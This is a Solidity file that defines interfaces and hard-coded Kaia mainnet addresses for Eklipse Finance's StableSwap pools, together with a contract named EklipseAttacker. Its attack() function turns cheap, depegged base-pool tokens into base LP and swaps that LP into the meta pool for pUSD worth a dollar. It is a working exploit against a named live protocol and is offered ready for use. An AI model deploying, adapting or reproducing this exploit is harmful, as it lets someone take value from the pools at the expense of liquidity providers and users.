// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}

/// Saddle-Finance-style StableSwap ABI (as deployed by Eklipse Finance on Kaia).
interface ISaddleSwap {
    function addLiquidity(uint256[] calldata amounts, uint256 minToMint, uint256 deadline)
        external
        returns (uint256);
    function removeLiquidity(uint256 amount, uint256[] calldata minAmounts, uint256 deadline)
        external
        returns (uint256[] memory);
    function removeLiquidityOneToken(uint256 tokenAmount, uint8 tokenIndex, uint256 minAmount, uint256 deadline)
        external
        returns (uint256);
    function swap(uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx, uint256 minDy, uint256 deadline)
        external
        returns (uint256);
    function calculateSwap(uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx)
        external
        view
        returns (uint256);
    function calculateTokenAmount(uint256[] calldata amounts, bool deposit)
        external
        view
        returns (uint256);
    function getTokenBalances() external view returns (uint256[] memory);
    function getTokens() external view returns (address[] memory);
    function getTokenIndex(address tokenAddress) external view returns (uint8);
    function getVirtualPrice() external view returns (uint256);
    function getA() external view returns (uint256);
    function getAPrecise() external view returns (uint256);
    function getLpToken() external view returns (address);
    function getNumberOfTokens() external view returns (uint256);
    function getAdminBalances() external view returns (uint256[] memory);
    function paused() external view returns (bool);
    function owner() external view returns (address);
    function feeDistributor() external view returns (address);
}

/// Eklipse Finance addresses (Kaia mainnet, chain id 8217).
library Eklipse {
    address internal constant BASE_POOL = 0x4F5d9F3b17988aA047e6F1Bc511fEc0BF25691f4; // KDAI/oUSDT/oUSDC
    address internal constant META_POOL = 0xe59234EeDC854b3b37D48EFd8a529069C3990F83; // baseLP/pUSD
    address internal constant BASE_LP = 0xd83b9dFa49D6C6d2A69554576e712E45A8A13E49; // EKLP (base pool LP)
    address internal constant META_LP = 0x63C7d72963ED6e0C255835B606BEF55EBEB1b5f8;
    address internal constant KDAI = 0x5c74070FDeA071359b86082bd9f9b3dEaafbe32b;
    address internal constant oUSDT = 0xceE8FAF64bB97a73bb51E115Aa89C17FfA8dD167;
    address internal constant oUSDC = 0x754288077D0fF82AF7a5317C7CB8c444D421d103;
    address internal constant PUSD = 0x168439b5EEbE8C83Db9eef44A0d76c6F54767Ae4;
    address internal constant KSD = 0x4Fa62F1f404188CE860c8f0041d6Ac3765a72E67;
    address internal constant KASH = 0xce40569d65106C32550626822B91565643c07823;
    address internal constant oBUSD = 0x210bC03f49052169D5588A52C317f71cF2078b85;
    address internal constant USDK = 0xd2137Fdf10bD9e4E850C17539eB24cfe28777753;
    address internal constant EKL = 0x807C4E063eb0aC21E8EeF7623A6ed50A8EDe58cA;
    address internal constant STAKING = 0xD067C3b871ee9E07BA4205A8F96c182baBBA6c58;
    address internal constant POOL2 = 0x625Ae9043E8730c4A1E30B36838502fb90e1D3C2;
}

/// Attack helper: convert cheap depegged base-pool tokens into base LP and
/// dump the LP into the meta pool in exchange for pUSD (which is worth $1).
contract EklipseAttacker {
    ISaddleSwap internal constant BASE = ISaddleSwap(Eklipse.BASE_POOL);
    ISaddleSwap internal constant META = ISaddleSwap(Eklipse.META_POOL);
    IERC20 internal constant KDAI = IERC20(Eklipse.KDAI);
    IERC20 internal constant PUSD = IERC20(Eklipse.PUSD);
    IERC20 internal constant BASELP = IERC20(Eklipse.BASE_LP);

    /// @notice Mint base LP from a single token and dump it into the meta pool for pUSD.
    /// @dev Caller must have transferred `depositAmount` of `tokenIn` to this contract first.
    function attack(address tokenIn, uint256 depositAmount)
        external
        returns (uint256 lpMinted, uint256 pusdReceived)
    {
        // 1. mint base LP from the cheap token
        uint256[] memory amounts = new uint256[](3);
        amounts[BASE.getTokenIndex(tokenIn)] = depositAmount;
        IERC20(tokenIn).approve(address(BASE), depositAmount);
        uint256 lpBefore = BASELP.balanceOf(address(this));
        BASE.addLiquidity(amounts, 0, block.timestamp);
        lpMinted = BASELP.balanceOf(address(this)) - lpBefore;

        // 2. dump base LP into the meta pool -> pUSD (index 0 = baseLP, index 1 = pUSD)
        BASELP.approve(address(META), lpMinted);
        uint256 pusdBefore = PUSD.balanceOf(address(this));
        META.swap(0, 1, lpMinted, 0, block.timestamp);
        pusdReceived = PUSD.balanceOf(address(this)) - pusdBefore;
    }
}
